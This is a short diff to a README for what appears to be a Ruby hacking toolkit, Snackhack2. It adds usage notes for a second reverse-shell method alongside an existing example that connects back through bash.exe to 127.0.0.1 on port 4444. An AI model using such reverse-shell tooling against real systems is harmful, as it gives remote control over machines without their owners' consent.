@@ -246,6 +246,12 @@ This will use bash.exe to connect to a reverse shell. On the remote computer run
 ```ruby
 rs = Snackhack2::ReverseShell.new("127.0.0.1", "4444")
 rs.bash
+
+
+## Version 2 of bash
+
+rs.version2
+
 ```
 
 ## Links
